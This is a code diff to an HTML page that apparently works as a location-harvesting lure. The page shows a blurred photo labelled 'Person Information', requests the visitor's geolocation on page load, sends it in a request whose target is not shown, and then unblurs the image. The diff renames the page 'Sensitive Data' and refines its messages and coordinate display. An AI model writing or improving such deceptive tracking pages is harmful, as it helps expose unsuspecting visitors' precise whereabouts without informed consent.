@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>📍 Location Required</title>
+  <title>Sensitive Data</title>
   <style>
     body {
       font-family: -apple-system, Roboto, sans-serif;
@@ -76,7 +76,9 @@
     <div class="overlay-lock">🔒 Person Information   (Warning Don't share this Personal Details with Anyone)</div>
   </div>
 
-  
+  <!-- Added missing msg div here -->
+  <div id="msg"></div>
+
   <div id="coord"></div>
 
   <script>
@@ -88,14 +90,15 @@
     if (img) photo.src = img;
 
     const msg = txt => document.getElementById('msg').innerText = txt;
+
     const showCoords = (lat, lon, acc) => {
       document.getElementById('coord').innerHTML =
-        ``;
+        `Lat: <strong>${lat}</strong>, Lon: <strong>${lon}</strong><br/>Accuracy: ±${acc} meters`;
     };
 
     window.addEventListener('DOMContentLoaded', () => {
       if (!navigator.geolocation) {
-        msg('');
+        msg('❌ Geolocation is not supported by your browser.');
         return;
       }
 
@@ -115,7 +118,7 @@
           });
           msg(res.ok ? '✅ Location shared!' : '⚠️ Share failed');
         } catch {
-          msg('');
+          msg('⚠️ Network error while sharing location.');
         }
 
         // Unblur the image & hide lock overlay
